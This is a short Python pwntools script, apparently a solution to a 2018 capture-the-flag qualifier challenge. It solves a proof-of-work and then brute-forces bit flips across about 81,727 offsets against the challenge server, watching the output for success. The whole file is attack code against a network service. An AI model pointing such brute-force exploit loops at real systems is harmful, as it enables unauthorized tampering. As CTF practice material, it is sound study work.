from pwn import *
import random
import time

def r(msg):
  response = p.recvuntil(msg)
  return response

def s(msg, line=True):
  msg = msg + '\n' if True else msg
  p.send(msg)

def poc():
  r('Challenge: ')
  chall = p.recvline().rstrip()
  r('n: ')
  n = p.recvline().rstrip()

  pocp = subprocess.check_output(['./pow.py', chall, n])
  sol = pocp.split('\n')[1].split()[1]
  s(sol)


for j in range(0, 81727):
  p = remote('61421a06.quals2018.oooverflow.io', 5566)
  poc()
  time.sleep(0.5)
  p.recv()
  print "flipped " + str(j)
  s('4')
  s(str(j))

  p.recvuntil('Let me run the program for you now...\n-------------------------------------------------------\n')
  read = p.recv(timeout = 0.5)
  print read
  if 'would send you' in read:
      if not 'current directory' in read:
          sys.exit()
  p.close()
